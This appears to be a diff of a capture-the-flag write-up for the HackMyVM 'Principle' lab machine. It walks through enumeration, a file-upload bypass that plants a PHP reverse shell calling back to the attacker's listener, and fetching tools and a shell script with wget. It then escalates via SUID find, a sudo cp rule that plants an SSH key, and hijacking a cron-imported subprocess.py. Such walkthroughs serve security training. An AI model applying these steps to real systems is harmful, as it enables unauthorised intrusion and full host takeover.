@@ -4,14 +4,14 @@
 ### ARP Scan
 
 ```bash
-gareth@gareth:~/hackmyvm/principle$ sudo arp-scan -l | grep 5a
+garffff@garffff:~/hackmyvm/principle$ sudo arp-scan -l | grep 5a
 192.168.0.210	08:00:27:d1:20:5a	PCS Systemtechnik GmbH
 ```
 
 ### Nmap Scan Results
 
 ```bash
-gareth@gareth:~/hackmyvm/principle$ sudo nmap -p- -sV -sC 192.168.0.210 -oA nmap/principle.tcp
+garffff@garffff:~/hackmyvm/principle$ sudo nmap -p- -sV -sC 192.168.0.210 -oA nmap/principle.tcp
 Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-02 18:38 BST
 Nmap scan report for 192.168.0.210
 Host is up (0.00050s latency).
@@ -28,38 +28,42 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 111.05 seconds
 ```
 
+Since we only have port 80, let's view it in a browser.
 ### Exploring Port 80
 
+Nothing here, but Nmap picked up a robots.txt
 
 ![[Pasted image 20240802183953.png]]
 
-Robots.txt
+Viewing `robots.txt`:
 
 ![[Pasted image 20240802183929.png]]
+Looks like we have some clues, I will view these individually:
 
-
-hi.html
+`hi.html`:
 
 ![[Pasted image 20240802184024.png]]
 
-
-/investigate:
+`/investigate`:
 
 ![[Pasted image 20240802184100.png]]
 
-
-Source: 
+Viewing the source of the page: 
 
 ![[Pasted image 20240802184126.png]]
+
+We see the HTML commets:
 
 ```bash
 <!-- If you like research, I will try to help you to solve the enigmas, try to search for documents in this directory -->
 ```
 
+Viewing `/hackme`  gave me nothing.
+
 Investigating the investigate directory:
 
 ```bash
-gareth@gareth:~/hackmyvm/principle$ feroxbuster -u http://192.168.0.146/investigate/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x ,.txt,.html,.php,.docx,.pdf
+garffff@garffff:~/hackmyvm/principle$ feroxbuster -u http://192.168.0.146/investigate/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x ,.txt,.html,.php,.docx,.pdf
 
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
@@ -93,15 +97,13 @@ by Ben "epi" Risher 🤓                 ver: 2.10.0
 [####################] - 2m   1543822/1543822 13198/s http://192.168.0.146/investigate/
 ```
 
-
-Come across this, looks to be base64 encoded:
+We see the file `rainbow_mystery.txt`.  Viewing this file to be base64 encoded:
 
 ![[Pasted image 20240802184400.png]]
-
-Decoding:
+Echoing the text and decoding within a terminal window:
 
 ```bash
-gareth@gareth:~/hackmyvm/principle$ echo 'QWNjb3JkaW5nIHRvIHRoZSBPbGQgVGVzdGFtZW50LCB0aGUgcmFpbmJvdyB3YXMgY3JlYXRlZCBi
+garffff@garffff:~/hackmyvm/principle$ echo 'QWNjb3JkaW5nIHRvIHRoZSBPbGQgVGVzdGFtZW50LCB0aGUgcmFpbmJvdyB3YXMgY3JlYXRlZCBi
 eSBHb2QgYWZ0ZXIgdGhlIHVuaXZlcnNhbCBGbG9vZC4gSW4gdGhlIGJpYmxpY2FsIGFjY291bnQs
 IGl0IHdvdWxkIGFwcGVhciBhcyBhIHNpZ24gb2YgdGhlIGRpdmluZSB3aWxsIGFuZCB0byByZW1p
 bmQgbWVuIG9mIHRoZSBwcm9taXNlIG1hZGUgYnkgR29kIGhpbXNlbGYgdG8gTm9haCB0aGF0IGhl
@@ -118,29 +120,29 @@ The answer is here:
 -.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-
 ```
 
-Morse code?
+Where it says `The answer is here`, this appears be be Morse code. I will use this site to decode it: https://capitalizemytitle.com/morse-code-translator/
 
 ![[Pasted image 20240802184444.png]]
 
-We have a domain name. Adding this to my host file:
+We have a domain name. I will adding this to my host file:
 
 ```bash
-gareth@gareth:~/hackmyvm/principle$ sudo nano /etc/hosts
+garffff@garffff:~/hackmyvm/principle$ sudo nano /etc/hosts
 ```
 
-![[Pasted image 20240802184640.png]]
+And paste in what I have found:
 
+![[Pasted image 20240802184640.png|center]]
 
+Going to this new domain takes us to another page:
 
+![[Pasted image 20240804132431.png]]
 
-Another page:
-
-![[Pasted image 20240801200757.png]]
-
-### vHost Subdomain enumeration:
+Not able to find much on this page, further enumeration was conducted:
+### Subdomain enumeration:
 
 ```bash
-gareth@gareth:~/hackmyvm/principle$ /opt/ffuf/ffuf -u http://t4l0s.hmv -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.t4l0s.hmv" -fs 615
+garffff@garffff:~/hackmyvm/principle$ /opt/ffuf/ffuf -u http://t4l0s.hmv -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.t4l0s.hmv" -fs 615
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -168,7 +170,7 @@ hellfire                [Status: 200, Size: 1659, Words: 688, Lines: 52, Duratio
 :: Progress: [114441/114441] :: Job [1/1] :: 10000 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
 ```
 
-adding this to my host file:
+Adding this to my host file:
 
 ![[Pasted image 20240802184916.png]]
 
@@ -176,13 +178,16 @@ Visiting the new subdomain:
 
 ![[Pasted image 20240802184954.png]]
 
+The text shows:
+
 ```bash
 [elohim@principle ~]$ echo "Road to $HOME, but you don't have access to the System. You should not look for the way, you have been warned." Road to /gehenna, but you don't have access to the System. You should not look for the way, you have been warned.
 ```
 
+Nothing much here, I will continue to do a directory bruteforce:
 
 ```bash
-gareth@gareth:~/hackmyvm/principle$ feroxbuster -u http://hellfire.t4l0s.hmv/ -w /opt/SecLists/Discovery/Web-Content/big.txt -x ,.txt,.html,.php
+garffff@garffff:~/hackmyvm/principle$ feroxbuster -u http://hellfire.t4l0s.hmv/ -w /opt/SecLists/Discovery/Web-Content/big.txt -x ,.txt,.html,.php
 
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
@@ -214,36 +219,42 @@ by Ben "epi" Risher 🤓                 ver: 2.10.0
 [####################] - 14s   102385/102385  7104/s  http://hellfire.t4l0s.hmv/archivos/                                              
 ```
 
+We have three files and the directory `archivos`
 
-
+Visiting `uploads.php`:
 
 ![[Pasted image 20240802185228.png]]
 
+Using the upload function, I uploaded a jpg file, to see what is going on:
+
 ![[Pasted image 20240802185312.png]]
 
-Reflective Cross-Site Scripting (XSS) Vulnerability:
+Not retentive, but I found a Reflective Cross-Site Scripting (XSS) Vulnerability - No use:
 
 ![[Pasted image 20240802185415.png]]
 
-
+Once the images are uploaded, they are stored in the `archivos` directory which can be viewed directly.
 
 ### Obtaining a Shell:
 
+The hack much be a file upload bypass. Should be straight forward enough. One of the first things I like to do is to change the content type as shown further down. For now, I will prep everything in order to obtain a shell connection.
+
+I will use the `php-reverse-shell.php` from seclists:
+
 ```bash
-gareth@gareth:~/hackmyvm/principle$ cp /opt/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php .
-gareth@gareth:~/hackmyvm/principle$ mv php-reverse-shell.php shell.php
-gareth@gareth:~/hackmyvm/principle$ subl shell.php
+garffff@garffff:~/hackmyvm/principle$ cp /opt/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php .
+garffff@garffff:~/hackmyvm/principle$ mv php-reverse-shell.php shell.php
+garffff@garffff:~/hackmyvm/principle$ subl shell.php
 ```
 
-Updated .php file:
+And updated the php file to include my IP details:
 
 ![[Pasted image 20240802185713.png]]
 
 Setting up a netcat reverse shell:
 
-
 ```bash
-gareth@gareth:~/hackmyvm/principle$ sudo nc -lvp 8888
+garffff@garffff:~/hackmyvm/principle$ sudo nc -lvp 8888
 Listening on 0.0.0.0 8888
 ```
 
@@ -278,10 +289,10 @@ Content-Type: image/jpeg
 <--SNIP-->
 ```
 
-Upload successfully. Browing to: http://hellfire.t4l0s.hmv/archivos/shell.php gave me a reverse shell:
+Upload successfully. Browsing to: http://hellfire.t4l0s.hmv/archivos/shell.php gave me a reverse shell:
 
 ```bash
-gareth@gareth:~/hackmyvm/principle$ sudo nc -lvp 8888
+garffff@garffff:~/hackmyvm/principle$ sudo nc -lvp 8888
 Listening on 0.0.0.0 8888
 Connection received on hellfire.t4l0s.hmv 37764
 Linux principle 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64 GNU/Linux
@@ -294,7 +305,7 @@ www-data
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Upgrading shell connection:
+Upgrading the shell connection:
 
 ```bash
 $ whereis python3
@@ -302,14 +313,16 @@ python3: /usr/bin/python3 /usr/lib/python3 /etc/python3 /usr/share/python3 /usr/
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@principle:/$ ^Z
 [1]+  Stopped                 sudo nc -lvp 8888
-gareth@gareth:~/hackmyvm/principle$ stty raw -echo
+garffff@garffff:~/hackmyvm/principle$ stty raw -echo
 sudo nc -lvp 8888ackmyvm/principle$ 
 
 
 www-data@principle:/$ 
 ```
 
-Privesc to first user (Talos)
+### Privilege Escalation to first user (Talos)
+
+Looking for setuid bit set, I saw the `find` command as this bit set. Executing this command will run as Talos:
 
 ```bash
 www-data@principle:~/html$ find / -perm -u=s -type f 2>/dev/null
@@ -331,11 +344,13 @@ ls -lash /usr/bin/find
 220K -rwsr-xr-x 1 talos root 220K Jan  8  2023 /usr/bin/find
 ```
 
-https://gtfobins.github.io/gtfobins/find/
+Looking on gtfobin: https://gtfobins.github.io/gtfobins/find/
+
+There is a simple command that allows us to obtain a shell as that user:
 
 ![[Pasted image 20240802190613.png]]
 
-
+Using that command we have a shell as the Talos user, but we are not in the correct user group:
 
 ```bash
 www-data@principle:~/html$ find . -exec /bin/bash -p \; -quit
@@ -346,7 +361,7 @@ talos
 uid=33(www-data) gid=33(www-data) euid=1000(talos) groups=33(www-data)
 ```
 
-But we are not in the correct user group:
+Exploring the home directory, we see a `note.txt`
 
 ```bash
 bash-5.2$ cd /home/talos
@@ -373,7 +388,7 @@ The tool I left you is still your ally. Good luck to you.
 
 ```
 
-Using linpeas.sh
+Not knowing my 12 gods of Olympus, I simply used `linpeas.sh` to help me enumerate the box further:
 
 Found `/etc/selinux/Afrodita.key`
 
@@ -395,7 +410,7 @@ Found `/etc/selinux/Afrodita.key`
   #)There are more creds/passwds files in the previous parent folde
 ```
 
-Linpeas also found this:
+Linpeas also found this. SSH is running on port `3445`, but it is not being allowed through the firewall. This may come in handy later:
 
 ```bash
 ╔══════════╣ Analyzing SSH Files (limit 70)
@@ -429,7 +444,7 @@ Here is my password:
 Hax0rModeON
 ```
 
-Using password:
+Using password to switch to the Talos:
 
 ```bash
 bash-5.2$ su talos
@@ -437,7 +452,7 @@ su talos
 Password: Hax0rModeON
 ```
 
-Now in the correct group:
+I am now in the correct group:
 
 ```bash
 talos@principle:~$ whoami && id
@@ -446,7 +461,7 @@ talos
 uid=1000(talos) gid=1000(talos) groups=1000(talos),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
 ```
 
-We can run cp as the elohim user
+Using the `sudo -l` We can run `cp` as the elohim user:
 
 ```bash
 talos@principle:~$ sudo -l
@@ -460,7 +475,9 @@ User talos may run the following commands on principle:
     (elohim) NOPASSWD: /bin/cp
 ```
 
-Copy public key into `authoized_keys` within that users `.ssh` directory:
+### Privilege Escalation to Second User (elohim)
+
+I decided to create a pair private/public keys used for SSH. I then copied public key into `authoized_keys` within the target users `.ssh` directory:
 
 ```bash
 talos@principle:~$ ssh-keygen
@@ -490,38 +507,31 @@ The key's randomart image is:
 +----[SHA256]-----+
 ```
 
-
-Making public available to everyone:
+Copying the key failed due to permission issues:
 
 ```bash
-talos@principle:~/.ssh$ ls -lash
-ls -lash
-total 16K
-4.0K drwx------ 2 talos talos 4.0K Aug  2 14:16 .
-4.0K drwxr-xr-x 4 talos talos 4.0K Jul 14  2023 ..
-4.0K -rw------- 1 talos talos 2.6K Aug  2 14:16 id_rsa
-4.0K -rwx------ 1 talos talos  569 Aug  2 14:16 id_rsa.pub
-talos@principle:~/.ssh$ chmod 777 id_rsa.pub
-chmod 777 id_rsa.pub
-talos@principle:~/.ssh$ ls -lash
-ls -lash
-total 16K
-4.0K drwx------ 2 talos talos 4.0K Aug  2 14:16 .
-4.0K drwxr-xr-x 4 talos talos 4.0K Jul 14  2023 ..
-4.0K -rw------- 1 talos talos 2.6K Aug  2 14:16 id_rsa
-4.0K -rwxrwxrwx 1 talos talos  569 Aug  2 14:16 id_rsa.pub
+talos@principle:~$ sudo -u elohim cp /home/talos/.ssh/id_rsa.pub /home/gehenna/.ssh/authorized_keys
+</.ssh/id_rsa.pub /home/gehenna/.ssh/authorized_keys
+cp: cannot stat '/home/talos/.ssh/id_rsa.pub': Permission denied
 ```
 
-Copying the key:
+However, I copied the public key to the `/tmp` directory:
 
 ```bash
+talos@principle:~$ cp .ssh/id_rsa.pub /tmp
+cp .ssh/id_rsa.pub /tmp
+```
+
+And copied again which was successful:
+
+```bash
+sudo -u elohim cp /home/talos/.ssh/id_rsa.pub
 talos@principle:~/.ssh$ sudo -u elohim cp /tmp/id_rsa.pub /home/gehenna/.ssh/authorized_keys
 < /tmp/id_rsa.pub /home/gehenna/.ssh/authorized_keys
 
 ```
 
-
-Access the ssh is denied:
+We appear not to have access the `ssh` binary program on the box:
 
 ```bash
 talos@principle:~/.ssh$ ssh -i id_rsa elohim@127.0.0.1 -p 3445
@@ -530,20 +540,31 @@ bash: /usr/bin/ssh: Permission denied
 
 ```
 
-Copying it over from my host:
+So, I copied my own ssh binary from my host machine to the target. I created a webserver to host this binary:
 
 ```bash
-gareth@gareth:~/hackmyvm/principle$ cp /bin/ssh .
-gareth@gareth:~/hackmyvm/principle$ sudo python3 -m http.server 80
+garffff@garffff:~/hackmyvm/principle$ cp /bin/ssh .
+garffff@garffff:~/hackmyvm/principle$ sudo python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.0.210 - - [02/Aug/2024 19:27:25] "GET /ssh HTTP/1.1" 200 -
 
-
 ```
 
-copyting it over:
+I copied  it over, and made it executable:
 
 ```bash
+talos@principle:~$ wget http://192.168.0.51/ssh
+wget http://192.168.0.51/ssh
+--2024-08-04 09:12:41--  http://192.168.0.51/ssh
+Connecting to 192.168.0.51:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 846888 (827K) [application/octet-stream]
+Saving to: ‘ssh’
+
+ssh                 100%[===================>] 827.04K  --.-KB/s    in 0.02s   
+
+2024-08-04 09:12:41 (49.4 MB/s) - ‘ssh’ saved [846888/846888]
+
 talos@principle:~$ ls -lash
 ls -lash
 total 868K
@@ -576,7 +597,7 @@ total 868K
 828K -rwxrwxrwx 1 talos talos 828K Aug  2 14:27 ssh
 ```
 
-Trying again:
+Now I can access the `elohim` user using SSH:
 
 ```bash
 talos@principle:~$ ./ssh -i .ssh/id_rsa elohim@127.0.0.1 -p 3445
@@ -611,25 +632,43 @@ total 40K
 4.0K drwx------ 2 elohim elohim 4.0K Jul  6  2023 .ssh
 ```
 
-In some kind of restricted shell:
-
-```bash
-elohim@principle:~$ cd /tmp
-cd /tmp
-bash: cd: restricted
-elohim@principle:~$ /bin/cd /tmp
-/bin/cd /tmp
-bash: /bin/cd: restricted: cannot specify `/' in command names
-```
-
-Reading the flag:
+I have landed in a restricted shell (rbash):
 
 ```bash
 elohim@principle:~$ cat flag.txt
 cat flag.txt
 rbash: cat:: No such file or directory
-elohim@principle:~$ /bin/cat flag.txt
-/bin/cat flag.txt
+```
+
+### Escaping rbash
+
+I created a Simple Python script, saved locally on my host as `shell.py`:
+
+```bash
+import os; os.system("/bin/bash")
+```
+
+Using `wget`, I copied the file over and executing it:
+
+```bash
+elohim@principle:~$ wget http://192.168.0.51/shell.py
+wget http://192.168.0.51/shell.py
+--2024-08-03 08:48:13--  http://192.168.0.51/shell.py
+Connecting to 192.168.0.51:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 31 [text/x-python]
+Saving to: ‘shell.py’
+
+shell.py            100%[===================>]      31  --.-KB/s    in 0s      
+
+2024-08-03 08:48:13 (217 KB/s) - ‘shell.py’ saved [31/31
+```
+
+I can now read the first user flag:
+
+```bash
+$ cat flag.txt
+cat flag.txt
                            _
                           _)\.-.
          .-.__,___,_.-=-. )\`  a`\_
@@ -656,13 +695,15 @@ CONGRATULATIONS, you have defeated me!
 
 The flag is:
 K|tW4bw7$zNh'PwSh/jN
+
 ```
 
-PrivEsc to root:
+## Privilege Escalation to Root: 
 
+Using `sudo -l` we can see we can using the script `/usr/bin/python3 /opt/reviewer.py` as root
 
 ```bash
-elohim@principle:~$ sudo -l
+$ sudo -l
 sudo -l
 Matching Defaults entries for elohim on principle:
     env_reset, mail_badpass,
@@ -676,8 +717,7 @@ User elohim may run the following commands on principle:
 Code:
 
 ```bash
-elohim@principle:~$ /bin/cat /opt/reviewer.py
-/bin/cat /opt/reviewer.py
+cat /opt/reviewer.py
 #!/usr/bin/python3
 
 import os
@@ -711,83 +751,126 @@ def enviar_mensaje_usuarios_conectados():
 enviar_mensaje_usuarios_conectados()
 ```
 
-```bash
-elohim@principle:~$ find / -type f -name subprocess.py 2>/dev/null
-find / -type f -name subprocess.py 2>/dev/null
+Using linpeas we find this:
+
+```
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+  Group sml:
 /usr/lib/python3.11/subprocess.py
-/usr/lib/python3.11/asyncio/subprocess.py
-elohim@principle:~$ ls -lash /usr/lib/python3.11/subprocess.py
-ls -lash /usr/lib/python3.11/subprocess.py
-84K -rw-rw-r-- 1 root sml 84K Jul 11  2023 /usr/lib/python3.11/subprocess.py
-elohim@principle:~$ id
-id
-uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
 ```
 
-My group can edit this file. I copied it to my host and made the following edit:
+And also this:
+
+The script `/opt/reviewer.py` is being executed every 5 minutes:
+
+```bash
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+*/5 * * * *	root	/opt/reviewer.py
+17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+
+```
+
+The `subprocess.py` is  being execute by the script as `import subprocess` is being used when ever it runs, and we have permissions to modify it.
+
+We can simply verify this:
+
+```
+$ id 
+id 
+uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
+$ ls -lash /usr/lib/python3.11/subprocess.py
+ls -lash /usr/lib/python3.11/subprocess.py
+84K -rw-rw-r-- 1 root sml 84K Jul 11  2023 /usr/lib/python3.11/subprocess.py
+
+```
+
+I copied `subprocess.py` to my host, I added the following code:
 
 ![[Pasted image 20240802195146.png]]
 
-Copying back to target:
+I copied the file back to target:
 
 ```bash
-elohim@principle:~$ wget http://192.168.0.51/subprocess.py
-wget http://192.168.0.51/subprocess.py
---2024-08-02 14:44:21--  http://192.168.0.51/subprocess.py
+$ wget http://192.168.0.51/subprocess.py 
+wget http://192.168.0.51/subprocess.py 
+--2024-08-03 08:54:33--  http://192.168.0.51/subprocess.py
 Connecting to 192.168.0.51:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 85786 (84K) [text/x-python]
 Saving to: ‘subprocess.py’
 
-subprocess.py       100%[===================>]  83.78K  --.-KB/s    in 0s      
+subprocess.py       100%[===================>]  83.78K  --.-KB/s    in 0.001s  
 
-2024-08-02 14:44:21 (515 MB/s) - ‘subprocess.py’ saved [85786/85786]
+2024-08-03 08:54:33 (157 MB/s) - ‘subprocess.py’ saved [85786/85786]
 
 ```
 
-Overwriting 
+Overwrited the exising file on the target:
 
 ```bash
-bash-5.2$ /bin/cp subprocess.py '/usr/lib/python3.11/subprocess.py'
-/bin/cp subprocess.py '/usr/lib/python3.11/subprocess.py
+$ /bin/cp subprocess.py /usr/lib/python3.11/subprocess.py
+/bin/cp subprocess.py /usr/lib/python3.11/subprocess.py
 ```
 
-Waiting for message:
+I also looked at the permissions for `/bin/bash`:
+
+```
+$ ls -lash /bin/bash
+ls -lash /bin/bash
+1.3M -rwxr-xr-x 1 root root 1.3M Apr 23  2023 /bin/bash
+```
+
+I decided to wait 5 minutes. The following message confirms the `reviewer.py` script has been executed:
 
 ```bash
 Broadcast message from root@principle (somewhere) (Fri Aug  2 14:50:01 2024):  
                                                                                
 I have detected an intruder, stealing accounts: elohim
-                                                                               
 ```
 
-SUID bit set:
+Looking at `/bin/bash` again, we see the SUID bit has been set:
 
 ```bash
-elohim@principle:~$ ls -lash /bin/bash
+$ ls -lash /bin/bash
 ls -lash /bin/bash
 1.3M -rwsr-xr-x 1 root root 1.3M Apr 23  2023 /bin/bash
 ```
 
-Going back to talos:
+Executing bash we get to the root user:
 
 ```bash
-elohim@principle:~$ exit
-exit
-exit
-Connection to 127.0.0.1 closed.
-talos@principle:~$ ls -lash /bin/bash
-ls -lash /bin/bash
-1.3M -rwsr-xr-x 1 root root 1.3M Apr 23  2023 /bin/bash
-talos@principle:~$ /bin/bash -p
+$ /bin/bash -p
 /bin/bash -p
 bash-5.2# whoami && id
 whoami && id
 root
-uid=1000(talos) gid=1000(talos) euid=0(root) groups=1000(talos),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
+uid=1001(elohim) gid=1001(elohim) euid=0(root) groups=1001(elohim),1002(sml)
+bash-5.2# cd /root
+cd /root
+bash-5.2# ls -lash
+ls -lash
+total 40K
+4.0K drwx------  5 root root 4.0K Jul 14  2023 .
+4.0K drwxr-xr-x 18 root root 4.0K Jul 11  2023 ..
+   0 -rw-------  1 root root    0 Jul 14  2023 .bash_history
+4.0K -rw-r--r--  1 root root  597 Jul  7  2023 .bashrc
+4.0K drwx------  3 root root 4.0K Jul  3  2023 .config
+4.0K -rw-------  1 root root   20 Jul  6  2023 .lesshst
+4.0K drwxr-xr-x  3 root root 4.0K Jun 30  2023 .local
+4.0K -rw-r--r--  1 root root  161 Jul  9  2019 .profile
+4.0K -rw-r-----  1 root root  478 Jul  7  2023 root.txt
+4.0K -rw-r--r--  1 root root   66 Jul  6  2023 .selected_editor
+4.0K drwx------  2 root root 4.0K Jul 13  2023 .ssh
+
 ```
 
-Root flag:
+And then we can finally read the root flag:
 
 ```bash
 bash-5.2# cd /root
